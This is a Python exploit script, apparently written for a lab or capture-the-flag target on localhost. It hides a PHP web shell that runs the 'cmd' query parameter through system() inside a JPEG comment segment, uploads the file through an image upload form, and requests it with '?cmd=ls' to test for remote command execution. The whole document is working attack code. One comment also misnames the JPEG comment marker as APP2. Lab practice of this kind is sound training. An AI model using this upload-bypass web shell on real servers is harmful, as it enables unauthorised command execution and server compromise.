import requests
import re

base_url = "http://127.0.0.1:32824"
print("Testing combined JPEG + htaccess polyglot")
print("=" * 60)

# Create a JPEG file that when parsed is a valid image
# But also contains hidden data that could be extracted
# We'll embed base64 encoded content in JPEG comments

# JPEG with embedded "shell" command
jpeg_with_shell = (
    b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x48\x48\x00\x01\x00\x01\x00\x00"
    b"\xff\xfe\x00\x1c"  # APP2 marker for comments
    b"#<?php system($_GET['cmd']); ?>"
    b"\xff\xc0\x00\x11\x08\x00\x01\x00\x01\x01\x01\x11\x00\x02\x11\x01\x03\x11\x01"
    b"\xff\xd9"
)

files = {'userfile': ('shell_embed.jpg', jpeg_with_shell, 'image/jpeg')}
data = {'submit': 'Upload Image'}

response = requests.post(f"{base_url}/index.php", files=files, data=data, timeout=10)
print(f"Upload Status: {response.status_code}")

if "successfully uploaded" in response.text:
    match = re.search(r"href='([^']+)'", response.text)
    if match:
        upload_path = match.group(1)
        file_url = f"{base_url}/{upload_path}"
        print(f"File uploaded: {file_url}")
        
        # Try to access it
        file_resp = requests.get(file_url, timeout=10)
        print(f"Access Status: {file_resp.status_code}")
        print(f"Content-Type: {file_resp.headers.get('content-type', 'unknown')}")
        print(f"Size: {len(file_resp.content)}")
        
        # Try to trigger the embedded PHP
        test_url = f"{file_url}?cmd=ls"
        exec_resp = requests.get(test_url, timeout=10)
        print(f"\nPHP Execution Test:")
        print(f"URL: {test_url}")
        print(f"Status: {exec_resp.status_code}")
        if exec_resp.text != file_resp.text:
            print(f"🔍 Different response - possible execution!\n{exec_resp.text[:1000]}")
        else:
            print("→ No execution detected")

print("\n" + "=" * 60)
print("Testing JPEG comment embedding complete.")
